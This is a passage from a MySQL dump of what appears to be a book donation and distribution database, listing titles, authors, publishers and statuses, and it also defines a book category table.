(16, '109', '2012-03-17', 2, 5, NULL, NULL, '0000-00-00', 'The Secret Seven-Three Exciting Adventures', 'Enid Blyton', 'Hodder Headline Limited', 'Received', 'absi'),
(17, '109', '2012-03-17', 2, 5, NULL, NULL, '0000-00-00', 'The Famous Five-Five Get Into a Fix', 'Enid Blyton', 'Hodder Headline Limited', 'Received', 'absi'),
(18, '109', '2012-03-17', 2, 5, 'ABSI', '135', '2012-03-18', 'The Mystery Of The Pantomime Cat', 'Enid Blyton', 'Egmont', 'Distributed', 'absi'),
(19, '109', '2012-03-17', 2, 5, 'ABSI', '135', '2012-03-18', 'The Mystery Of The Invisible Thief', 'Enid Blyton', 'Egmont', 'Distributed', 'absi'),
(20, '109', '2012-03-17', 2, 5, NULL, NULL, '0000-00-00', 'The Famous Five-Five Go To Smuggler''s Top', 'Enid Blyton', 'Hodder Headline Limited', 'Received', 'absi'),
(21, '109', '2012-03-17', 2, 5, 'ABSI', '134', '2012-03-18', 'Return To The Mystery Series', 'Enid Blyton', 'Egmont', 'Distributed', 'absi'),
(22, '109', '2012-03-17', 2, 5, 'ABSI', '134', '2012-03-19', 'The Famous Five-Five Have A Wonderful Time', 'Enid Blyton', 'Hodder Headline Limited', 'Distributed', 'absi'),
(23, '109', '2012-03-17', 2, 5, NULL, NULL, '0000-00-00', 'The Famous Five-Five Have Plenty Of Fun', 'Enid Blyton', 'Hodder Headline Limited', 'Received', 'absi'),
(24, '109', '2012-03-17', 2, 5, NULL, NULL, '0000-00-00', 'The Mystery Of The Spiteful Letters', 'Enid Blyton', 'Egmont', 'Received', 'absi'),
(25, '109', '2012-03-17', 2, 5, 'ABSI', '134', '2012-03-18', 'The Rockingdown Mystery-A Barney Mystery', 'Enid Blyton', 'Award Publications Limited', 'Distributed', 'absi'),
(26, '109', '2012-03-17', 2, 5, 'ABSI', '135', '2012-03-18', 'The Mystery Of The Hidden House', 'Enid Blyton', 'Egmont', 'Distributed', 'absi'),
(27, '109', '2012-03-17', 2, 5, 'ABSI', '134', '2012-03-18', 'The Enchanted Wood ', 'Enid Blyton', 'Egmont', 'Distributed', 'absi'),
(28, '109', '2012-03-17', 2, 5, NULL, NULL, '0000-00-00', 'Five O''Clock Tales', 'Enid Blyton', 'Mammoth', 'Received', 'absi'),
(29, '109', '2012-03-17', 2, 4, 'ABSI', '132', '2012-03-18', 'Animal Stories For Eight Year Old', 'NA', 'Macmillan Childern''s Books', 'Distributed', 'absi'),
(30, '109', '2012-03-17', 2, 5, NULL, NULL, '0000-00-00', 'The Naughtiest Girl-Keeps a Secret', 'Anne Digby', 'Hodder Headline Limited', 'Received', 'absi'),
(31, '109', '2012-03-17', 2, 5, NULL, NULL, '0000-00-00', 'The Secret Seven-Secret Seven Adventure', 'Enid Blyton', 'Hodder Headline Limited', 'Received', 'absi'),
(32, '109', '2012-03-17', 2, 5, NULL, NULL, '0000-00-00', 'The Secret Seven-Good Old Secret Seven', 'Enid Blyton', 'Hodder Headline Limited', 'Received', 'absi'),
(33, '109', '2012-03-17', 2, 5, NULL, NULL, '0000-00-00', 'First Three Years Of Boarding School-St Clare''s', 'Enid Blyton', 'Egmont', 'Received', 'absi'),
(34, '109', '2012-03-17', 2, 4, 'ABSI', '134', '2012-03-18', 'Witch And Wizard Stories', 'NA', 'Kingfisher', 'Distributed', 'absi'),
(35, '109', '2012-03-17', 2, 5, 'ABSI', '133', '2012-03-18', 'My Mum''s From Planet PLuto', 'Gwyneth Rees', 'Macmillan Childern''s Books', 'Distributed', 'absi'),
(36, '109', '2012-03-17', 3, 6, NULL, NULL, '0000-00-00', 'Hotel', 'Arthur Hailey', 'Hotel', 'Received', 'absi'),
(37, '109', '2012-03-17', 2, 5, NULL, NULL, '0000-00-00', 'The Famous Five-Five On Finniston Farm', 'Enid Blyton', 'Hodder Headline Limited', 'Received', 'absi'),
(38, '109', '2012-03-17', 2, 5, NULL, NULL, '0000-00-00', 'The Secret Seven', 'Enid Blyton', 'Hodder Headline Limited', 'Received', 'absi'),
(39, '109', '2012-03-17', 2, 4, NULL, NULL, '0000-00-00', 'Scary Stories', 'NA', 'Macmillan Childern''s Books', 'Received', 'absi'),
(40, '109', '2012-03-17', 2, 5, NULL, NULL, '0000-00-00', 'The Secret Seven-Three Exciting Adventures', 'Enid Blyton', 'Hodder Headline Limited', 'Received', 'absi'),
(41, '109', '2012-03-17', 2, 5, 'ABSI', '134', '2012-03-18', 'The Valley Of Adventure,The Sea Of Adventure ', 'Enid Blyton', 'Macmillan Childern''s Books', 'Distributed', 'absi'),
(42, '109', '2012-03-17', 2, 4, 'ABSI', '125', '2012-03-17', 'The Puffin Book Of Funny Storie', 'NA', 'Puffin Books', 'Distributed', 'absi'),
(43, '109', '2012-03-17', 2, 4, 'ABSI', '132', '2012-03-18', 'Stories For Seven Year Olds', 'NA', 'Kingfisher', 'Received', 'absi'),
(44, '63', '2012-03-17', 4, 9, NULL, NULL, '0000-00-00', 'The Wonders Of The World In 60 Miesnut', '', '', 'Received', 'absi'),
(45, '63', '2012-03-17', 4, 9, NULL, NULL, '0000-00-00', 'The Wonders Of The World In 60 Miesnut', 'NA', 'Knowledge Inc', 'Received', 'absi'),
(46, '63', '2012-03-17', 3, 6, 'ABSI', '136', '2012-03-18', 'The Odessa File', 'Frederick Forsyth', 'Corgi Books', 'Distributed', 'absi'),
(47, '63', '2012-03-17', 4, 10, 'ABSI', '136', '2012-03-18', '31 Mantras For Personality Development', 'Abhishek Thakore', 'Pustak Mahal', 'Distributed', 'absi'),
(48, '63', '2012-03-17', 4, 9, 'ABSI', '125', '2012-03-17', 'Tell Me Why', 'NA', 'Octopus India', 'Distributed', 'absi'),
(49, '63', '2012-03-17', 2, 5, NULL, NULL, '0000-00-00', 'The Ship Of Adventure', 'Enid Blyton', 'Macmillan Childern''s Books', 'Received', 'absi'),
(50, '63', '2012-03-17', 4, 10, NULL, NULL, '0000-00-00', 'My Life -Bobby Ball', 'NA', 'Hodder And Stoughton', 'Received', 'absi'),
(51, '63', '2012-03-17', 2, 5, 'ABSI', '134', '2012-03-18', 'The Naughtiest Girl-Again', 'Enid Blyton', 'Hodder Headline Limited', 'Distributed', 'absi'),
(52, '63', '2012-03-17', 4, 9, 'ABSI', '136', '2012-03-18', 'History Of The World', 'Arjun Dev,Indira Arjun Dev', 'Orient Black Swan', 'Distributed', 'absi'),
(53, '63', '2012-03-17', 2, 5, NULL, NULL, '0000-00-00', 'The Famous Five - Five On Finniston Farm', 'Enic Blyton', 'Hodder Headline Limited', 'Received', 'absi'),
(54, '63', '2012-03-17', 2, 5, NULL, NULL, '0000-00-00', 'The Mystery Of Banshee Towers', 'Enic Blyton', 'Egmot', 'Received', 'absi'),
(55, '63', '2012-03-17', 2, 4, 'ABSI', '133', '2012-03-18', 'Animal Stories', 'Helen Paiba', 'MacmillanChildren''s Books', 'Distributed', 'absi'),
(56, '63', '2012-03-17', 2, 4, 'ABSI', '132', '2012-03-18', 'Adventure Stories', 'Helen Paiba', 'Macmillan Children''s Books', 'Distributed', 'absi'),
(57, '63', '2012-03-17', 2, 5, NULL, NULL, '0000-00-00', 'Last Term At Malory Towers', 'Enic Blyton', 'Egmont', 'Received', 'absi'),
(58, '63', '2012-03-17', 5, 12, 'ABSI', '135', '2012-03-18', 'Thesaursus', 'NA', 'Scholastic', 'Distributed', 'absi'),
(59, '63', '2012-03-17', 4, 11, 'ABSI', '81', '2012-03-17', 'You Can Win', 'Shiv Khera', 'Macmillan India Ltd', 'Distributed', 'absi'),
(60, '63', '2012-03-17', 2, 5, NULL, NULL, '0000-00-00', 'The Famous Five - Three Exciting Adventures', 'Enic Blyton', 'Hodder Headline Limited', 'Received', 'absi'),
(61, '63', '2012-03-17', 2, 5, NULL, NULL, '0000-00-00', 'The Famous Five - Three Exciting Adventures', 'Enic Blyton', 'Hodder Headline Limited', 'Received', 'absi'),
(62, '63', '2012-03-17', 1, 13, 'ABSI', '83', '2012-03-17', 'Markrting Research', 'David J. luck', 'Prentice Hall Of India Private Limited', 'Distributed', 'absi'),
(63, '63', '2012-03-17', 1, 13, NULL, NULL, '0000-00-00', 'Markrting Research', 'David J. luck', 'Prentice Hall Of India Private Limited', 'Received', 'absi'),
(64, '63', '2012-03-17', 2, 5, NULL, NULL, '0000-00-00', 'The Famous Five - Three Exciting Adventures', 'Enic Blyton', 'Hodder Headline Limited', 'Received', 'absi'),
(65, '63', '2012-03-17', 1, 13, 'ABSI', '83', '2012-03-17', 'Business Law', 'K.C.Garg ', 'Kalyani Publishers', 'Distributed', 'absi'),
(66, '63', '2012-03-17', 4, 9, 'ABSI', '130', '2012-03-18', 'A Short History Of Nearly Everything', 'Bill Bryson', 'Black Swan', 'Distributed', 'absi'),
(67, '63', '2012-03-17', 1, 1, 'ABSI', '124', '2012-03-17', 'The 10-Day MBA', 'Steven Silbiger', 'Magna Publishing Co.Ltd', 'Distributed', 'absi'),
(68, '63', '2012-03-17', 3, 6, NULL, NULL, '0000-00-00', 'Lion Of Macedon', 'David Cemmell', 'Orbit Books', 'Received', 'absi'),
(69, '63', '2012-03-17', 3, 6, NULL, NULL, '0000-00-00', 'Papillon', 'Henri Charriere', 'Harper Collins', 'Received', 'absi'),
(70, '63', '2012-03-17', 3, 22, NULL, NULL, '0000-00-00', 'The Men And The Girls', 'Joanna Trollope', 'Black Swan', 'Received', 'absi'),
(71, '63', '2012-03-17', 2, 4, 'ABSI', '134', '2012-03-18', 'The Famous Five - Five Go To Demon''s Rocks', 'Enid Blyton', 'Hodder Headline Limited', 'Distributed', 'absi'),
(72, '63', '2012-03-17', 4, 15, NULL, NULL, '0000-00-00', 'Ivanhoe', 'Sir Walter Scott', 'Modern Promotions', 'Received', 'absi'),
(73, '63', '2012-03-17', 2, 16, 'ABSI', '136', '2012-03-18', 'Figuring', 'Shakuntala Devi', 'Orient Paperbacks', 'Distributed', 'absi'),
(74, '63', '2012-03-17', 6, 23, NULL, NULL, '0000-00-00', 'How To Solve Cross Word Puzzles', 'R.K.Murthi', 'Pustak Mahal', 'Received', 'absi'),
(75, '63', '2012-03-17', 3, 22, 'ABSI', '135', '2012-03-18', 'Five For Sorrow, Ten For Joy', 'Rumer Godden', 'Futura', 'Distributed', 'absi'),
(76, '63', '2012-03-17', 3, 22, NULL, NULL, '0000-00-00', 'The Take That Fact File', 'Rick Sky', 'Grafton', 'Received', 'absi'),
(77, '63', '2012-03-17', 3, 6, 'ABSI', '136', '2012-03-18', 'The Whispering Statue', 'Carolyn Keene', 'Grosset & Dunlap', 'Distributed', 'absi'),
(78, '63', '2012-03-18', 4, 9, 'ABSI', '130', '2012-03-18', 'Rommel', 'Desmond Young', 'Fontana', 'Distributed', 'absi'),
(79, '63', '2012-03-18', 3, 22, NULL, NULL, '0000-00-00', 'Kane and Abel', 'Jeffrey Archer', 'Hodder And Stoughton', 'Received', 'absi'),
(80, '63', '2012-03-18', 3, 22, NULL, NULL, '0000-00-00', 'The Complete Novels Of Jane Austen', 'Jane Austen', 'Modern Library', 'Received', 'absi'),
(81, '63', '2012-03-18', 5, 12, NULL, NULL, '0000-00-00', 'Chambers 20th Century Dictionary', 'NA', 'Allied Publishers', 'Received', 'absi'),
(82, '63', '2012-03-18', 3, 22, NULL, NULL, '0000-00-00', 'The Colour Of Law ', 'Mark Gimenez', 'Doubleday', 'Received', 'absi'),
(83, '63', '2012-03-18', 3, 22, 'ABSI', '136', '2012-03-18', 'The Reader', 'Bernhard Schlink', 'Phoenix', 'Distributed', 'absi'),
(84, '63', '2012-03-18', 4, 10, NULL, NULL, '0000-00-00', 'Mike Tyson', 'Reg Gutteridge And Norman Giller', 'A Star Book', 'Received', 'absi'),
(85, '63', '2012-03-18', 2, 5, NULL, NULL, '0000-00-00', 'The Clue In The Crossword Cipher', 'Carolyne Keene', 'Grosset & Dunlap', 'Received', 'absi'),
(86, '63', '2012-03-18', 4, 15, NULL, NULL, '0000-00-00', 'Lectures From Colombo To Almora', 'Swami Vivekananda', 'Advaita Ashrama', 'Received', 'absi'),
(87, '63', '2012-03-18', 2, 16, NULL, NULL, '0000-00-00', 'Mathematics For Class 8', 'R S Aggarwal', 'Bharati Bhawan', 'Received', 'absi'),
(88, '63', '2012-03-18', 2, 19, NULL, NULL, '0000-00-00', 'IGCSE Physics', 'Tom Duncan And Heather Kennett', 'Hodder Education', 'Received', 'absi'),
(89, '63', '2012-03-18', 2, 17, '', NULL, '0000-00-00', 'Discover Geography - Book 8', 'J Balagopal', 'Oreint Longman', 'Received', 'ABSI'),
(90, '63', '2012-03-18', 2, 16, NULL, NULL, '0000-00-00', 'ABC Of Mathematics Class 7', 'NA', 'Holy Faith International', 'Received', 'absi'),
(91, '63', '2012-03-18', 2, 16, NULL, NULL, '0000-00-00', 'Lab Manual Mathematics Book 8', 'Jharna De', 'Cordova Publications Pvt Ltd', 'Received', 'absi'),
(92, '63', '2012-03-18', 2, 16, NULL, NULL, '0000-00-00', 'New Enjoying Mathematics Class 8', 'Jose Paul', 'Oxford University Press', 'Received', 'absi'),
(93, '63', '2012-03-18', 2, 17, NULL, NULL, '0000-00-00', 'Panorama Geography Class 8', 'Anuradha Mukherjee', 'Dorling Kindersley(India) Pvt Ltd', 'Received', 'absi'),
(94, '63', '2012-03-18', 2, 18, NULL, NULL, '0000-00-00', 'Science In Everyday Life Class 8', 'Vaishali Gupta', 'Oxford University Press', 'Received', 'absi'),
(95, '63', '2012-03-18', 2, 25, NULL, NULL, '0000-00-00', 'History Class 8', 'Chitra Srinivas', 'Oxford University Press', 'Received', 'absi'),
(96, '63', '2012-03-18', 2, 19, NULL, NULL, '0000-00-00', 'Learning Elementry Physics Part 2 For Class 8', 'V K Sally', 'Goyal Brothers Prakashan', 'Received', 'absi'),
(97, '63', '2012-03-18', 2, 24, NULL, NULL, '0000-00-00', 'New Seasons Literature Reader Class 8', 'Nita Mukheriee', 'Dorling Kindersley (India) Pvt Ltd', 'Received', 'absi'),
(98, '63', '2012-03-18', 2, 24, NULL, NULL, '0000-00-00', 'New Seasons Course Book Class 8', 'Sarita Manuja', 'Dorling Kindersley (India) Pvt Ltd', 'Received', 'absi'),
(99, '63', '2012-03-18', 2, 18, NULL, NULL, '0000-00-00', 'Science In Everyday Life Class 8', 'Vaishali Gupta', 'Oxford University Press', 'Received', 'absi'),
(100, '63', '2012-03-18', 2, 25, NULL, NULL, '0000-00-00', 'History Class 8', 'Vipul Singh', 'Dorling Kindersley (India) Pvt Ltd', 'Received', 'absi'),
(101, '63', '2012-03-18', 2, 16, NULL, NULL, '0000-00-00', 'New Enjoying Mathematics Class 8', 'Jose Paul', 'Oxford University Press', 'Received', 'absi'),
(102, '63', '2012-03-18', 2, 18, NULL, NULL, '0000-00-00', 'Science In Everyday Life Class 7', 'Vaishali Gupta', 'Oxford University Press', 'Received', 'absi'),
(103, '63', '2012-03-18', 2, 4, 'ABSI', '132', '2012-03-18', 'Animal Stories', 'NA', 'Award Publications Limited', 'Distributed', 'absi'),
(104, '63', '2012-03-18', 2, 16, NULL, NULL, '0000-00-00', 'Abacus Number Textbook Class 4', 'Ginn', 'Reed Educational And Professional Publishing Limited', 'Received', 'absi'),
(105, '63', '2012-03-18', 2, 16, 'ABSI', '132', '2012-03-18', 'Mental Math ', 'Richard S Piccirilli', 'Scholastic Professional Books', 'Distributed', 'absi'),
(106, '63', '2012-03-18', 4, 15, NULL, NULL, '0000-00-00', 'Tales You Love', 'NA', 'Manava Seva Kendra', 'Received', 'absi'),
(107, '63', '2012-03-18', 2, 5, NULL, NULL, '0000-00-00', 'The Mystery Of Burnt Cottage', 'Enic Blyton', 'Egmont', 'Received', 'absi'),
(108, '63', '2012-03-18', 3, 6, 'ABSI', '133', '2012-03-18', 'One Two Buckle My Shoe', 'Agatha Christie', 'Harper Collins', 'Distributed', 'absi'),
(109, '63', '2012-03-18', 3, 6, 'ABSI', '133', '2012-03-18', 'I''ll Seeing You', 'Mary Higgins Clark', 'Pocket Books', 'Distributed', 'absi'),
(110, '63', '2012-03-18', 2, 5, NULL, NULL, '0000-00-00', 'The Circus of Adventure', 'Enic Blyton', 'Macmillan Children''s Books', 'Received', 'absi'),
(111, '63', '2012-03-18', 4, 15, NULL, NULL, '0000-00-00', 'Vivekananda His Call To The Nation', 'NA', 'Advaita Ashrama', 'Received', 'absi'),
(112, '63', '2012-03-18', 2, 4, NULL, NULL, '0000-00-00', 'Baby Sitters Little Sister 2', 'Ann M Martin', 'Scholastic', 'Received', 'absi'),
(113, '63', '2012-03-18', 2, 16, NULL, NULL, '0000-00-00', 'The Book Of Numbers', 'Shakuntala Devi', 'Orient Paperbacks', 'Received', 'absi'),
(114, '63', '2012-03-18', 5, 12, NULL, NULL, '0000-00-00', 'Roget''s Thesaures Of Synonyms And Antonyms', 'Peter Mark Roget', 'University London', 'Received', 'absi'),
(115, '63', '2012-03-18', 4, 15, NULL, NULL, '0000-00-00', 'Americanize Your Pronunciation', 'NA', 'Credence Publishers Pvt Ltd', 'Received', 'absi'),
(116, '63', '2012-03-18', 4, 15, NULL, NULL, '0000-00-00', 'Americanize Your Pronunciation', 'NA', 'Credence Publishers Pvt Ltd', 'Received', 'absi'),
(117, '63', '2012-03-18', 4, 15, NULL, NULL, '0000-00-00', 'Vivekananda His Call To The Nation', 'NA', 'Advaita Ashrama', 'Received', 'absi'),
(118, '63', '2012-03-18', 4, 15, NULL, NULL, '0000-00-00', 'Personality Development', 'Swami Vivekananda', 'Advaita Ashrama', 'Received', 'absi'),
(119, '63', '2012-03-18', 4, 11, NULL, NULL, '0000-00-00', 'Love & Marriage', 'Reader''s Digest', 'Rdi Print And Publishing Pvt Ltd', 'Received', 'absi'),
(120, '63', '2012-03-18', 4, 11, NULL, NULL, '0000-00-00', 'Secret Of Concentration', 'Swami Purushottamananda', 'The President', 'Received', 'absi'),
(121, '63', '2012-03-18', 4, 10, NULL, NULL, '0000-00-00', 'Vivekananda', 'NA', 'Swami Jnanadananda', 'Received', 'absi'),
(122, '63', '2012-03-18', 4, 11, NULL, NULL, '0000-00-00', 'Obstacles Are For Overcomin', 'NA', 'NA', 'Received', 'absi'),
(123, '63', '2012-03-18', 4, 15, NULL, NULL, '0000-00-00', 'Prayer Book', 'NA', 'The President Of Rk Math', 'Received', 'absi'),
(124, '63', '2012-03-18', 5, 12, 'ABSI', '133', '2012-03-18', 'Thesaursus', 'NA', 'Longman Group Ltd', 'Distributed', 'absi'),
(125, '63', '2012-03-18', 3, 6, 'ABSI', '136', '2012-03-18', 'Quick Bites', 'Tanya Huff', 'Orbit Books', 'Distributed', 'absi'),
(126, '128', '2012-03-18', 7, 29, NULL, NULL, '0000-00-00', 'Management Accounting And Financial Analysis', 'ICAI', 'ICAI', 'Received', 'absi'),
(127, '128', '2012-03-18', 7, 28, NULL, NULL, '0000-00-00', 'select cases in direct and indirect taxes', 'ICAI', 'ICAI', 'Received', 'absi'),
(128, '128', '2012-03-18', 7, 28, NULL, NULL, '0000-00-00', 'revision test papers final course', 'ICAI', 'ICAI', 'Received', 'absi'),
(129, '128', '2012-03-18', 7, 29, NULL, NULL, '0000-00-00', 'Advanced Accounting', 'R.L.Gupta and M.Radhaswamy', 'Sultan Chand and Sons', 'Received', 'absi'),
(130, '126', '2012-03-18', 7, 26, NULL, NULL, '0000-00-00', 'Information technology fundamentals NIIT', 'NIIT', 'NIIT', 'Received', 'absi'),
(131, '126', '2012-03-18', 7, 26, NULL, NULL, '0000-00-00', 'Information technology fundamentals NIIT', 'NIIT', 'NIIT', 'Received', 'absi'),
(132, '128', '2012-03-18', 7, 28, NULL, NULL, '0000-00-00', 'direct taxes', 'ICAI', 'ICAI', 'Received', 'absi'),
(133, '126', '2012-03-18', 7, 26, NULL, NULL, '0000-00-00', 'Information technology fundamentals NIIT Vol 1', 'NIIT', 'NIIT', 'Received', 'absi'),
(134, '126', '2012-03-18', 7, 26, 'ABSI', '136', '2012-03-18', 'Information Systems Management-Vol:3', 'NIIT', 'NIIT', 'Distributed', 'absi'),
(135, '128', '2012-03-18', 7, 28, NULL, NULL, '0000-00-00', 'indirect taxes', 'ICAI', 'ICAI', 'Received', 'absi'),
(136, '128', '2012-03-18', 7, 29, NULL, NULL, '0000-00-00', 'Advanced Studies In Cost Accounting ', 'P. Das Gupta', 'Premier Book Company ', 'Received', 'absi'),
(137, '126', '2012-03-18', 7, 26, NULL, NULL, '0000-00-00', 'Implementing Relational Databases using MS-SQL Server Vol 3', 'NIIT', '', 'Received', 'absi'),
(138, '126', '2012-03-18', 7, 26, NULL, NULL, '0000-00-00', 'Implementing Relational Databases using MS-SQL Server Vol 3', 'NIIT', 'NIIT', 'Received', 'absi'),
(139, '126', '2012-03-18', 7, 26, NULL, NULL, '0000-00-00', 'Information Systems Management-Vol:4', 'NIIT', 'NIIT', 'Received', 'absi'),
(140, '128', '2012-03-18', 7, 28, 'ABSI', '121', '2012-03-18', 'Business and Corporate Laws', 'N.D. Kapoor', 'sultan chand and bro', 'Distributed', 'absi'),
(141, '128', '2012-03-18', 7, 29, NULL, NULL, '0000-00-00', 'Indian Accounting Standards', 'V. Krishnan', 'Resources Effective Development Society ', 'Received', 'absi'),
(142, '126', '2012-03-18', 7, 26, NULL, NULL, '0000-00-00', 'Information Systems Management-Vol:1', 'NIIT', 'NIIT', 'Received', 'absi'),
(143, '126', '2012-03-18', 7, 27, NULL, NULL, '0000-00-00', 'Science fair projects with Electricity and Electronics', 'Bob bonnet and Dan Keen', 'Scholastic Inc.', 'Received', 'absi'),
(144, '128', '2012-03-18', 7, 28, 'ABSI', '121', '2012-03-18', 'corporate laws', 'taxmann', 'taxmann', 'Distributed', 'absi'),
(145, '126', '2012-03-18', 7, 26, NULL, NULL, '0000-00-00', 'Semester-Information Systems Management-Vol:1', 'NIIT', 'NIIT', 'Received', 'absi'),
(146, '128', '2012-03-18', 7, 28, NULL, NULL, '0000-00-00', 'students guide to income tax', 'Dr. Vinod K. Singhania', 'taxmann', 'Received', 'absi'),
(147, '128', '2012-03-18', 2, 16, NULL, NULL, '0000-00-00', 'Holy Faith Practice Book In Mathematics ', 'S.M. Vashisth ', 'Holy Faith International', 'Received', 'absi'),
(148, '126', '2012-03-18', 7, 27, 'ABSI', '136', '2012-03-18', 'Java and Advanced Java', 'CMC Computer Education', 'CMC Computer Education', 'Distributed', 'absi'),
(149, '126', '2012-03-18', 7, 27, NULL, NULL, '0000-00-00', 'Programming in C++', 'CMC', '', 'Received', 'absi'),
(150, '126', '2012-03-18', 7, 26, NULL, NULL, '0000-00-00', 'Semester 3-Information Systems Management-Vol:2', 'NIIT', 'NIIT', 'Received', 'absi'),
(151, '126', '2012-03-18', 7, 27, NULL, NULL, '0000-00-00', 'Programming in C++', 'CMC Computer Education', 'CMC Computer Education', 'Received', 'absi'),
(152, '128', '2012-03-18', 7, 29, NULL, NULL, '0000-00-00', 'management information and control system', 'ICAI', 'ICAI', 'Received', 'absi'),
(153, '126', '2012-03-18', 7, 26, NULL, NULL, '0000-00-00', 'Semester 3-Information Systems Management-Vol:3', 'NIIT', 'NIIT', 'Received', 'absi'),
(154, '128', '2012-03-18', 7, 29, NULL, NULL, '0000-00-00', 'MICS handbook', 'saraswathi', 'murali', 'Received', 'absi'),
(155, '126', '2012-03-18', 2, 18, NULL, NULL, '0000-00-00', 'Tell me why - Children''s Science digest', 'Dr. A.M. Malhotra and P.S. Bright', 'Bright careers institute ', 'Received', 'absi'),
(156, '128', '2012-03-18', 7, 29, NULL, NULL, '0000-00-00', 'corporate finance', 'P.V. Kulkarni', 'himalaya publishing house', 'Received', 'absi'),
(157, '126', '2012-03-18', 7, 26, NULL, NULL, '0000-00-00', 'Foundation Semester Vol 2', 'NIIT', 'n\\', 'Received', 'absi'),
(158, '126', '2012-03-18', 3, 7, NULL, NULL, '0000-00-00', 'Marvels of Science - From Atom to Nano-tech', '', 'CBT', 'Received', 'absi'),
(159, '128', '2012-03-18', 7, 28, NULL, NULL, '0000-00-00', 'direct and indirect taxes', 'T.N. Manoharan', 'snow white publications', 'Received', 'absi'),
(160, '128', '2012-03-18', 7, 28, NULL, NULL, '0000-00-00', 'income tax and central sales tax', 'ICAI', 'ICAI', 'Received', 'absi'),
(161, '128', '2012-03-18', 7, 28, NULL, NULL, '0000-00-00', 'study material of mercantile law', 'ICAI', 'ICAI', 'Received', 'absi'),
(162, '128', '2012-03-18', 7, 28, NULL, NULL, '0000-00-00', 'taxation of fringe benifits', 'Dr. Vinod K. Singhania', 'taxmann', 'Received', 'absi'),
(163, '126', '2012-03-18', 7, 26, NULL, NULL, '0000-00-00', 'GNIIT Industry Orientation Kit - Vol 1:Career Development Manual-1', 'NIIT', 'NIIT', 'Received', 'absi'),
(164, '128', '2012-03-18', 7, 29, NULL, NULL, '0000-00-00', 'cost management', 'ICAI', 'ICAI', 'Received', 'absi'),
(165, '126', '2012-03-18', 7, 26, NULL, NULL, '0000-00-00', 'Information systems management - Fundamentals of MS- Access - Vol3Access', 'NIIT', 'NIIT', 'Received', 'absi'),
(166, '128', '2012-03-18', 7, 28, NULL, NULL, '0000-00-00', 'corporate laws and secretarial practice', 'ICAI', 'ICAI', 'Received', 'absi'),
(167, '126', '2012-03-18', 7, 26, NULL, NULL, '0000-00-00', 'Information systems management - Information search and analysis skills - Vol1', 'NIIT', 'NIIT', 'Received', 'absi'),
(168, '128', '2012-03-18', 7, 29, NULL, NULL, '0000-00-00', 'auditing standards', 'D.S. Rawat', 'taxmann', 'Received', 'absi'),
(169, '126', '2012-03-18', 7, 26, NULL, NULL, '0000-00-00', 'Information systems management - Common business processes', 'NIIT', 'NIIT', 'Received', 'absi'),
(170, '128', '2012-03-18', 1, 3, NULL, NULL, '0000-00-00', 'study material economics', 'ICAI', 'ICAI', 'Received', 'absi'),
(171, '131', '2012-03-18', 4, 11, NULL, NULL, '0000-00-00', 'How To Shape The Personality', 'Sri Ramakrishna Math', 'Sri Ramakrishna Math', 'Received', 'absi'),
(172, '128', '2012-03-18', 1, 3, NULL, NULL, '0000-00-00', 'managerial economics', 'P.L. Mehta', 'sultan chand and bro', 'Received', 'absi'),
(173, '128', '2012-03-18', 7, 29, NULL, NULL, '0000-00-00', 'Cost management ', 'B. Saravana Prasath', 'C. Sitaram & Co. pvt.ltd', 'Received', 'absi'),
(174, '128', '2012-03-18', 7, 29, NULL, NULL, '0000-00-00', 'Cost management ', 'B. Saravana Prasath', 'C. Sitaram & Co. pvt.ltd', 'Received', 'absi'),
(175, '128', '2012-03-18', 7, 29, NULL, NULL, '0000-00-00', 'study material fundamentals of accountancy', 'ICAI', 'ICAI', 'Received', 'absi'),
(176, '128', '2012-03-18', 7, 28, NULL, NULL, '0000-00-00', 'Indirect taxes', 'Yogendra bangar, Vandana bangar', 'AP ', 'Received', 'absi'),
(177, '128', '2012-03-18', 7, 29, NULL, NULL, '0000-00-00', 'advanced auditing', 'ICAI', 'ICAI', 'Received', 'absi'),
(178, '131', '2012-03-18', 4, 11, NULL, NULL, '0000-00-00', 'Handbook For Life', 'Caroline Righton', 'Hodder Mobius', 'Received', 'absi'),
(179, '128', '2012-03-18', 7, 28, NULL, NULL, '0000-00-00', 'study material of mercantile law', 'ICAI', 'ICAI', 'Received', 'absi'),
(180, '128', '2012-03-18', 7, 28, NULL, NULL, '0000-00-00', 'SICA, Companies amdt. bill, Securities laws, CARO', 'TAXMANN', 'TAXMANN allied services (P.) ltd', 'Received', 'absi'),
(181, '131', '2012-03-18', 4, 15, NULL, NULL, '0000-00-00', 'The Weather Makers', 'Tim Flannery', 'Grove Press', 'Received', 'absi'),
(182, '128', '2012-03-18', 7, 28, NULL, NULL, '0000-00-00', 'Study papers - Direct and Indirect taxes - Amendments made by finance act', 'ICAI', 'ICAI', 'Received', 'absi'),
(183, '131', '2012-03-18', 4, 15, NULL, NULL, '0000-00-00', 'How To Build Character', 'Swami Budhananda', 'Advaita Ashrama', 'Received', 'absi'),
(184, '128', '2012-03-18', 7, 29, NULL, NULL, '0000-00-00', 'Advanced accounting', 'ICAI', 'ICAI', 'Received', 'absi'),
(185, '131', '2012-03-18', 4, 15, NULL, NULL, '0000-00-00', 'The Emerging Markets Century', 'Antoine Van Agtmael', 'Simon & Schuster', 'Received', 'absi'),
(186, '128', '2012-03-18', 7, 29, NULL, NULL, '0000-00-00', 'Management information and control systems for CA final', 'N.R.Govindarajan, G.Sekar,B.Saravanan Prasat', 'C. Sitaram & Co. pvt.ltd', 'Received', 'absi'),
(187, '126', '2012-03-18', 7, 26, NULL, NULL, '0000-00-00', 'Information systems management - Modeling and designing a data ware house - II ', 'NIIT', 'NIIT', 'Received', 'absi'),
(188, '63', '2012-03-18', 2, 20, NULL, NULL, '0000-00-00', 'Civics 8', 'Jasmine Dhillon', 'Pearson Longman', 'Received', 'absi'),
(189, '63', '2012-03-18', 3, 6, NULL, NULL, '0000-00-00', 'The Warwick Shakesphere- Twelth night', 'Arthur D. Innes', 'Blackie & Son ltd', 'Received', 'absi'),
(190, '63', '2012-03-18', 3, 22, NULL, NULL, '0000-00-00', 'Saving grace', 'Julie Garwood', 'Pocket Star', 'Received', 'absi'),
(191, '63', '2012-03-18', 3, 22, NULL, NULL, '0000-00-00', 'Positive Selling', 'Richard Moss', 'Jaico Publications', 'Received', 'absi');

-- --------------------------------------------------------

--
-- Table structure for table `uc_category`
--

CREATE TABLE IF NOT EXISTS `uc_category` (
  `categoryid` int(10) NOT NULL AUTO_INCREMENT,
  `categoryname` varchar(50) NOT NULL,
  PRIMARY KEY (`categoryid`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=8 ;

--
-- Dumping data for table `uc_category`
--

INSERT INTO `uc_category` (`categoryid`, `categoryname`) VALUES
(1, 'Business'),
(2, 'Children'),
